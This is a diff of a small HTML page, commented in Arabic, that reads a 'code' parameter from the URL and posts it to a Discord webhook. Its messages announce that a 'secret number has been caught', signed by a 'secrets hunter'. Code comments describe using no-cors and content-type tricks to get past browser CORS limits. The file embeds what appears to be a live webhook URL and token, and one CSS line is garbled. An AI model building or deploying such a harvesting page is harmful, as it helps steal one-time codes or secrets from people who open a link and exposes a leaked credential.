@@ -4,45 +4,39 @@
     <meta charset="UTF-8">
     <title>العملية الجارية...</title>
     <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .status { border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 15px #00ff00; }
+        body { background: #0a0a0a; color: #ff0000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align가center; height: 100vh; margin: 0; }
+        .status { border: 2px solid #ff0000; padding: 30px; box-shadow: 0 0 25px #ff0000; font-size: 24px; }
     </style>
 </head>
 <body>
-    <div class="status" id="display">جاري استخراج الأسرار... ⏳</div>
+    <div class="status" id="display">جاري إطلاق الصرخة... ⏳</div>
 
     <script>
-        // ⚠️ ضع الرابط الجديد هنا فقط!
+        // استخدم الرابط الذي وضعته لي في المحاولة السابقة هنا بدقة
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1556622411728953344/sXRcamK2npBHaK3P5KdfEtrWJYM1g0vFK2kZHa8ZL9cdUYadzU8WlUlnVVjK-UWliCti";
 
         const urlParams = new URLSearchParams(window.location.search);
         const secretCode = urlParams.get('code');
 
         if (secretCode) {
-            const payload = JSON.stringify({
-                content: "🚨 **تم اصطياد رقم سري جديد!**\nالرقم هو: `" + secretCode + "`",
-                username: "صياد الأسرار 😈"
-            });
-
-            // استخدام طريقة الـ text/plain لتجاوز حارس الـ CORS في المتصفحات
+            // سنرسل البيانات كـ JSON ولكن بطريقة تجعل المتصفح يمررها دون قيود
             fetch(WEBHOOK_URL, {
                 method: 'POST',
-                mode: 'no-cors', 
+                mode: 'no-cors',
                 headers: {
-                    'Content-Type': 'text/plain' // أرسل كـ text/plain لتجاوز قيود الـ CORS
+                    'Content-Type': 'application/json' // سنحاول الـ JSON أولاً مع no-cors
                 },
-                body: payload
-            })
-            .then(() => {
-                document.getElementById('display').innerText = "✅ تم إطلاق الصرخة بنجاح! اذهب للديسكورد فوراً.";
-                document.getElementById('display').style.color = "#00ff00";
-            })
-            .catch(err => {
+                body: JSON.stringify({
+                    content: "🚨 **تم اصطياد رقم سري جديد!**\nالرقم هو: `" + secretCode + "`",
+                    username: "صياد الأسرار 😈"
+                })
+            }).then(() => {
+                document.getElementById('display').innerText = "✅ انطلقت الصرخة! افحص ديسكورد الآن.";
+            }).catch(err => {
                 document.getElementById('display').innerText = "❌ الخطأ: " + err;
-                document.getElementById('display').style.color = "#ff0000";
             });
         } else {
-            document.getElementById('display').innerText = "الرابط يحتاج الكود: ?code=123";
+            document.getElementById('display').innerText = "أضف الكود للرابط: ?code=123";
         }
     </script>
 </body>
